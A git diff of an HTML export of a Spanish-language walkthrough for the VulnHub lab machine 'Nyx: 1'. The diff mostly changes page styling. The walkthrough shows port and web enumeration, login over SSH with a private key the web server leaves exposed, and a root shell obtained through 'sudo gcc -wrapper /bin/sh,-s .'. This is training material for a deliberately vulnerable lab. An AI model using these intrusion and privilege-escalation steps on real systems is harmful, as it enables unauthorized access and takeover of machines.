@@ -666,8 +666,23 @@ blockquote {
 	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
 }
 	
-</style></head><body style="background-color: #E5E8E8"><article id="0f0e0e56-4197-43c2-917b-b243f046f9d9" class="page sans"><header><img class="page-cover-image" src="https://www.notion.so/images/page-cover/met_winslow_homer_maine_coast.jpg" style="object-position:center 60%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="https://www.notion.so/icons/package_green.svg"/></div><h1 class="page-title"><strong><strong>Nyx: 1</strong></strong></h1></header><div class="page-body"><p id="1e9332e0-652b-4bae-b2e2-6e5d2e96c346" class="">
-</p><p id="4a6aac56-5f44-430f-9d7c-c7fb1bd318e5" class="">@<a href="https://www.vulnhub.com/entry/nyx-1,535/">https://www.vulnhub.com/entry/nyx-1,535/</a></p><hr id="8a0aed2c-2c36-4d1d-bf1c-bd9ab127cf34"/><h3 id="84dc5c76-df7e-463a-a128-3bc26edd361b" class=""><mark class="highlight-blue">Intrusion</mark></h3><p id="6ab1108f-05b9-420e-8394-4dafda8b81a5" class="">Escaneo con Nmap para descubrir puertos abiertos en la máquina.</p><pre id="b73590fb-8616-40be-9aba-b7ff7804ad55" class="code"><code>nmap 192.168.1.38
+</style></head><link href="css/prism.css" rel="stylesheet" />
+<body style="background-color: #E5E8E8"><head>
+  <style>
+    body {
+      background-image: url('assets/gris.jpg');
+      background-repeat: no-repeat;
+      background-size: cover;
+      background-attachment: fixed;
+    }
+  </style>
+</head><style>
+    body {
+      color: azure;
+    }
+  </style>
+<article id="0f0e0e56-4197-43c2-917b-b243f046f9d9" class="page sans"><header><img class="page-cover-image" src="https://www.notion.so/images/page-cover/met_winslow_homer_maine_coast.jpg" style="object-position:center 60%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="https://www.notion.so/icons/package_green.svg"/></div><h1 class="page-title"><strong><strong>Nyx: 1</strong></strong></h1></header><div class="page-body"><p id="1e9332e0-652b-4bae-b2e2-6e5d2e96c346" class="">
+</p><p id="4a6aac56-5f44-430f-9d7c-c7fb1bd318e5" class="">@<a href="https://www.vulnhub.com/entry/nyx-1,535/">https://www.vulnhub.com/entry/nyx-1,535/</a></p><hr id="8a0aed2c-2c36-4d1d-bf1c-bd9ab127cf34"/><h3 id="84dc5c76-df7e-463a-a128-3bc26edd361b" class=""><mark class="highlight-blue">Intrusion</mark></h3><p id="6ab1108f-05b9-420e-8394-4dafda8b81a5" class="">Escaneo con Nmap para descubrir puertos abiertos en la máquina.</p><pre id="b73590fb-8616-40be-9aba-b7ff7804ad55" class="code"><code class="language-javascript">nmap 192.168.1.38
 Starting Nmap 7.92
 Nmap scan report for 192.168.1.38
 Host is up (0.0012s latency).
@@ -675,7 +690,7 @@ PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http</code></pre><ul id="865574c8-29f7-4331-8d52-2a5ae5852a19" class="bulleted-list"><li style="list-style-type:disc">22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</li></ul><ul id="afbad3dc-345e-4d2d-88ec-6547752fb11f" class="bulleted-list"><li style="list-style-type:disc">80/tcp open http Apache httpd 2.4.38 ((Debian))</li></ul><p id="4b2888da-51fb-4c67-8fb8-b988004a249e" class="">
 </p><p id="da7b084d-a8c3-4b94-a0d1-3f5296b2b083" class="">El puerto 80 muestra la siguiente web:</p><figure id="a493f8c8-1952-41b2-891a-2103031a556f" class="image" style="text-align:center"><a href="Nyx%201%200f0e0e56419743c2917bb243f046f9d9/Untitled.png"><img style="width:1152px" src="Nyx%201%200f0e0e56419743c2917bb243f046f9d9/Untitled.png"/></a></figure><p id="63816ca3-7dfc-4194-b5c3-568c93694633" class="">
-</p><p id="e2df13be-4bbe-433b-886d-33af3d8494e2" class="">Empiezo enumerando la web con Gobuster.</p><pre id="54ad5efc-e55b-48b2-8f15-065bdd912c44" class="code"><code>gobuster dir -u http://192.168.1.38/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</p><p id="e2df13be-4bbe-433b-886d-33af3d8494e2" class="">Empiezo enumerando la web con Gobuster.</p><pre id="54ad5efc-e55b-48b2-8f15-065bdd912c44" class="code"><code class="language-javascript">gobuster dir -u http://192.168.1.38/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ===============================================================
 Gobuster v3.1.0
 ===============================================================
@@ -694,7 +709,7 @@ Gobuster v3.1.0
 ===============================================================
 Finished
 ===============================================================</code></pre><p id="3195aa39-945b-4a6f-a2be-acd2adc0ae56" class="">
-</p><p id="a9c562e2-5669-4ef5-8ccb-7b564ecb1522" class="">No reporta nada interesante, por lo que sigo enumerando con el script http.enum de nmap.</p><pre id="c1b8cc12-0c16-4ee2-a1ad-2abe86f44b18" class="code"><code>nmap --script http-enum -p 80 192.168.1.38
+</p><p id="a9c562e2-5669-4ef5-8ccb-7b564ecb1522" class="">No reporta nada interesante, por lo que sigo enumerando con el script http.enum de nmap.</p><pre id="c1b8cc12-0c16-4ee2-a1ad-2abe86f44b18" class="code"><code class="language-javascript">nmap --script http-enum -p 80 192.168.1.38
 Nmap scan report for 192.168.1.38
 Host is up (0.00067s latency).
 
@@ -703,7 +718,7 @@ PORT   STATE SERVICE
 | http-enum: 
 |_  /d41d8cd98f00b204e9800998ecf8427e.php: Seagate BlackArmorNAS 110/220/440 Administrator Password Reset Vulnerability</code></pre><p id="8ab67429-4a5b-474b-b876-d59d2fab37fc" class="">
 </p><figure id="6ba900a8-f98c-4c10-bc0e-bef3ca73b862" class="image"><a href="Nyx%201%200f0e0e56419743c2917bb243f046f9d9/Untitled%201.png"><img style="width:960px" src="Nyx%201%200f0e0e56419743c2917bb243f046f9d9/Untitled%201.png"/></a></figure><p id="897f355f-971f-48db-9a9f-278bedfe2ddf" class="">La ruta muestra una clave de SSH que parece ser de <mark class="highlight-teal">mpampis </mark>por el título de la página. La guardo como id_rsa y dándole permisos a esta clave privada me puedo conectar como <mark class="highlight-teal">mpampis </mark>al servicio ssh sin la contraseña del usuario.</p><p id="2ada2345-6baa-487a-9c41-040c239a0394" class="">
-</p><pre id="17dbc05c-5c1b-441a-8c8f-6bb7ad98d2d4" class="code"><code>❯ ls -l
+</p><pre id="17dbc05c-5c1b-441a-8c8f-6bb7ad98d2d4" class="code"><code class="language-javascript">❯ ls -l
 .rw------- eddie eddie 1.8 KB Sat Feb 11 20:42:11 2023  id_rsa
 ❯ ssh -i id_rsa mpampis@192.168.1.38
 Linux nyx 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
@@ -720,17 +735,18 @@ mpampis@nyx:~$ whoami
 mpampis
 mpampis@nyx:~$</code></pre><p id="d8e5a50f-5c1b-445c-af8c-da1c2cbb4223" class="">
 </p><hr id="2be25d8d-d55f-44e4-957f-045403bb6de8"/><h3 id="f41b5533-d440-4291-b1f3-5b2afab760ae" class=""><mark class="highlight-blue">Elevando Privilegios</mark></h3><p id="e9ada3a1-f21a-469a-8c08-32ff4258f6be" class="">
-</p><p id="931a0f4d-94a4-4216-aedd-527fccfad2a6" class="">Con sudo -l listo los comandos permitidos para el usuario.</p><pre id="a4c60293-f896-49ef-9ebd-7b38fb929539" class="code"><code>mpampis@nyx:~$ sudo -l
+</p><p id="931a0f4d-94a4-4216-aedd-527fccfad2a6" class="">Con sudo -l listo los comandos permitidos para el usuario.</p><pre id="a4c60293-f896-49ef-9ebd-7b38fb929539" class="code"><code class="language-javascript">mpampis@nyx:~$ sudo -l
 Matching Defaults entries for mpampis on nyx:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 User mpampis may run the following commands on nyx:
     (root) NOPASSWD: /usr/bin/gcc</code></pre><p id="273ebf7a-fa46-4b06-b85b-94a0a36f02fc" class="">
-</p><p id="d16760cf-876f-4ea3-9179-f1dee9138ee1" class="">Se puede ejecutar como <mark class="highlight-red">root</mark> gcc, con una búsqueda del binario en <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> nos da un comando para obtener una shell.</p><figure id="535175df-a04c-4efe-ad50-6d32068c9d26" class="image"><a href="Nyx%201%200f0e0e56419743c2917bb243f046f9d9/Untitled%202.png"><img style="width:768px" src="Nyx%201%200f0e0e56419743c2917bb243f046f9d9/Untitled%202.png"/></a></figure><pre id="b4250c0a-c98a-4365-9859-c8dcb10b9a7a" class="code"><code>mpampis@nyx:~$ whoami
+</p><p id="d16760cf-876f-4ea3-9179-f1dee9138ee1" class="">Se puede ejecutar como <mark class="highlight-red">root</mark> gcc, con una búsqueda del binario en <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> nos da un comando para obtener una shell.</p><figure id="535175df-a04c-4efe-ad50-6d32068c9d26" class="image"><a href="Nyx%201%200f0e0e56419743c2917bb243f046f9d9/Untitled%202.png"><img style="width:768px" src="Nyx%201%200f0e0e56419743c2917bb243f046f9d9/Untitled%202.png"/></a></figure><pre id="b4250c0a-c98a-4365-9859-c8dcb10b9a7a" class="code"><code class="language-javascript">mpampis@nyx:~$ whoami
 mpampis
 mpampis@nyx:~$ sudo gcc -wrapper /bin/sh,-s .
 # whoami
 root
 # hostname
 nyx
-#</code></pre></div></article></body></html>
+#</code></pre></div></article></body><script src="css/prism.css"></script>
+</html>
